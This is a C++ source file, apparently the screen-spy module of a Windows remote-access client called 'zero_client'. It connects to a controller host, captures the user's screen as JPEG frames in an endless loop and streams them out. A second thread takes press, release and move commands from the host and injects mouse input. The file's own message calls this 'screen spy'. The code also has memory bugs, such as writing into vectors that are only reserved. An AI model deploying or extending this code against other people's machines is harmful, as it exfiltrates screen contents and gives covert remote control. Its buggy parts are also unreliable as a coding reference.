#include "Screen.h"



Screen::Screen(char*ip, int port)
{
	int ret = socket.connectToHost(ip, port);
	if (ret == 0)
	{
		//	break;
	}

	/*
	Info myinfo;
	myinfo.host = ip;
	myinfo.port = port;
	HANDLE h;
	h = CreateThread(NULL, 0, readThread, &myinfo, 0, NULL);
	*/

	Sleep(1000);
	char Head[10] = "SCREEN&";
	socket.write(Head);

	char name[1024] = "OPEN_SCREEN";

	char buf[1024] = { 0 };
	string two = socket.read(buf);

	if (name != two)		//返回是否为OPEN_FILE
	{
		return;
	}

	// 开始传送数据
	const int fps = 18;  // 每秒帧度，你能自己设置
	do {
		Sleep(1000/fps);

		// 截取屏幕，再把它转换成jpg格式
		std::vector<unsigned char> bmp, jpg;
		
		if (!captureScreen(bmp)) {
			return;
		}
		

		
		unsigned int len = 0;
		if ((len = convertToJpgData(bmp)) == 0) {
			return;
		}
		
		// 发送数据
		
		int rec = sendScreenData(&socket, len);
		if (rec == false)
		{
			return;
		}
		
		

	} while (1);

	// 完成
	std::cout << "Finished screen spy" << std::endl;
}



unsigned int  Screen::convertToJpgData(const std::vector<unsigned char> &bmpData)
{
	// 锁定函数，其他线程不能进来
	////EnterCriticalSection(&gCs);

	// 设置图片大小
	unsigned int iByte = 3;
	unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
	unsigned int iHeigth = GetSystemMetrics(SM_CYSCREEN);
	unsigned int iBmpSize = iWidth * iHeigth * iByte;
	if (iWidth == 1366) {
		iWidth = 1360;
	}

	//  由於bitmap和jpg的儲存方式是相反,所以要把他反過來
	//  例如: rgb: 1 2 3  ->  9 8 7
	//            4 5 6  ->  6 5 4
	//            7 8 9  ->  3 2 1
	const unsigned char *bmp = &bmpData[0];
	std::vector<unsigned char> convertedBmp;
	convertedBmp.reserve(iBmpSize);
	unsigned char *cBmp = (unsigned char*)&convertedBmp[0];

	for (unsigned int i = 0, j; i < iHeigth; i++) {
		for (j = 0; j < iWidth; j++) {
			cBmp[i * iWidth *  iByte + j * 3] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte + 2];
			cBmp[i * iWidth *  iByte + j * 3 + 1] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte + 1];
			cBmp[i * iWidth *  iByte + j * 3 + 2] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte];
		}
	}

	// 设置jpg结构
	struct jpeg_compress_struct jcs;
	struct jpeg_error_mgr jem;

	jcs.err = jpeg_std_error(&jem);
	jpeg_create_compress(&jcs);

	// 设置输出配置
	jcs.image_height = iHeigth;
	jcs.image_width = iWidth;
	jcs.input_components = iByte;
	jcs.in_color_space = JCS_RGB;

	jpeg_set_defaults(&jcs);

	// 设置压缩质量
	const int quality = 100;     // 越大越好，越小越差，你可以自己设置
	jpeg_set_quality(&jcs, quality, TRUE);

	// 设置输出文件（临时文件来的，名字随便设置）
	const std::string fileName = "c:/zero_client_screen_capture.tmp";
	FILE *fp = fopen(fileName.data(), "wb+");
	if (!fp) {
		std::cout << "Failed to create file " << fileName << " error:"
			<< ferror(fp) << std::endl;


		// 解除函数锁定
		////LeaveCriticalSection(&gCs);
		return 0;
	}

	jpeg_stdio_dest(&jcs, fp);

	// 开始压缩
	jpeg_start_compress(&jcs, TRUE);
//	typedef JSAMPLE *JSAMPROW;
	JSAMPROW jr;
	while (jcs.next_scanline < iHeigth) {
		jr = &cBmp[jcs.next_scanline * iWidth * iByte];
		jpeg_write_scanlines(&jcs, &jr, 1);
	}

	// 释放
	jpeg_finish_compress(&jcs);
	jpeg_destroy_compress(&jcs);
	fclose(fp);

	FILE *fpp = fopen("c:/zero_client_screen_capture.tmp", "r");
	if (!fpp) return -1;
	fseek(fpp, 0L, SEEK_END);
	int size = ftell(fpp);
	fclose(fpp);

	return size;
}

bool Screen::sendScreenData(Socket *sock, unsigned int len)
{
	// 发送头包
	int ssszie = len + 1024;
	char *buffer = new char[ssszie];
	memset(buffer, 0, ssszie);

	char sendSize[99] = { 0 };	//文件大小
	itoa(ssszie, sendSize, 10);

		char *buff = new char[ssszie];
		memset(buff, 0, ssszie);

	HANDLE pfile;
	pfile = ::CreateFile("c:/zero_client_screen_capture.tmp", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (pfile == INVALID_HANDLE_VALUE)
	{
		cout << "打开文件失败" << endl;;
		CloseHandle(pfile); // 一定注意在函数退出之前对句柄进行释放
		return false;
	}
	DWORD readsize;
	ReadFile(pfile, buff, ssszie, &readsize, NULL);

	strncat(buffer, sendSize, strlen(sendSize));
	strncat(buffer, "#", 1);
	memcpy(buffer + (strlen(sendSize) + 1), buff, readsize);

	int overSend = socket.write(buffer, ssszie);
	if (overSend == -1)
	{
		return false;
	}
	CloseHandle(pfile);

	delete[] buffer;
	delete[] buff;
	DeleteFileA("c:/zero_client_screen_capture.tmp");
	buffer = NULL;
	buff = NULL;

	return true;
}
bool Screen::captureScreen(std::vector<unsigned char> &bmpData)
{
	// 锁定函数，其他线程不能进来
//	////EnterCriticalSection(&gCs);

	HBITMAP hBitmap;

	// 得到屏幕设备
	HDC hScrDC = CreateDCA(_T("DISPLAY"), NULL, NULL, NULL);
	if (!hScrDC) {
		std::cout << "Failed to get screen device" << std::endl;


		// 解除函数锁定
//		////LeaveCriticalSection(&gCs);
		return false;
	}

	// 创建新的设备
	HDC hRamDC = CreateCompatibleDC(hScrDC);
	if (!hRamDC) {
		std::cout << "Failed to create device" << std::endl;


		// 解除函数锁定
//		////LeaveCriticalSection(&gCs);
		return false;
	}

	// 设置图片大小
	unsigned int iByte = 3;
	unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
	unsigned int iHeigth = GetSystemMetrics(SM_CYSCREEN);
	unsigned int iBmpSize = iWidth * iHeigth * iByte;
	if (iWidth == 1366) {
		iWidth = 1360;
	}

	// 创建位图
	BITMAPINFOHEADER bmpInfoHeader;
	BITMAPINFO bmpInfo;
	void *p;

	bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpInfoHeader.biBitCount = 32;
	bmpInfoHeader.biPlanes = 1;
	bmpInfoHeader.biCompression = BI_RGB;
	bmpInfoHeader.biWidth = iWidth;
	bmpInfoHeader.biHeight = iHeigth;
	bmpInfo.bmiHeader = bmpInfoHeader;

	// 获取位图
	hBitmap = CreateDIBSection(hScrDC, &bmpInfo, DIB_RGB_COLORS, &p, NULL, 0);
	if (!hBitmap) {
		std::cout << "Failed to CreateDIBSection" << std::endl;


		// 解除函数锁定
//		////LeaveCriticalSection(&gCs);
		return false;
	}

	// 绑定设备与对象
	HBITMAP hBitmapOld;
	hBitmapOld = (HBITMAP)SelectObject(hRamDC, hBitmap);

	// 把屏幕复制到新申请的设备上
	StretchBlt(hRamDC, 0, 0, iWidth, iHeigth, hScrDC, 0, 0, iWidth, iHeigth, SRCCOPY);

	// 复制图片到内存空间
	bmpData.reserve(iBmpSize);
	HDC hTmpDC = GetDC(NULL);
	hBitmap = (HBITMAP)SelectObject(hRamDC, hBitmapOld);

	bmpInfoHeader.biBitCount = 24;
	int iError = GetDIBits(hTmpDC, hBitmap, 0, iHeigth, &bmpData[0], (BITMAPINFO *)&bmpInfoHeader, DIB_RGB_COLORS);
	if (!iError) {
		std::cout << "Failed to GetDIBits" << std::endl;


		// 解除函数锁定
//		////LeaveCriticalSection(&gCs);
		return false;
	}

	// 释放设备与对象
	DeleteDC(hScrDC);
	DeleteDC(hRamDC);
	DeleteObject(hBitmapOld);
	DeleteDC(hTmpDC);
	DeleteObject(hBitmap);

	// 解除函数锁定
//	////LeaveCriticalSection(&gCs);
	return true;
}

Screen::~Screen()
{
}

DWORD WINAPI Screen::readThread(LPVOID pM)
{
	Info *myinfo = (Info*)pM;

	Socket thread;
	int ret = thread.connectToHost(myinfo->host, myinfo->port);
	if (ret == 0)
	{
		//	break;
		return 0;
	}

	Sleep(2000);
	char Head[10] = "MOUSE&";
	thread.write(Head);

	char name[1024] = "OPEN_MOUSE";

	char buf[1024] = { 0 };
	string two = thread.read(buf);

	if (name != two)		//返回是否为OPEN_FILE
	{
		return 0;
	}

	while (1)
	{
		char buf[100];
		thread.read(buf, 100);


		vector<string> list;
	//	string buffer = buf;
	//	const char* cc = buffer.data();
	//	char* dd = const_cast<char*>(cc);

		char *tok = strtok(buf, "#");
		while (tok)
		{
			list.push_back(tok);
			tok = strtok(NULL, "#");
		}

		int ListSize = list.size();
		//	cout << "list size:" << ListSize;
		if (list.size() == 0)
		{
			return 0;
		}

		string head = list.at(0);
		if (head == "press")
		{
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
		}
		if (head == "release")
		{
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		}
		if (head == "move")
		{
			if (list.size() < 3)
			{
				return 0;
			}
			char xs[4];
			char ys[4];
			int x = atoi(list.at(1).data());
			int y = atoi(list.at(2).data());
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, x, y, 0, 0);
		}
	}
	return 0;
}

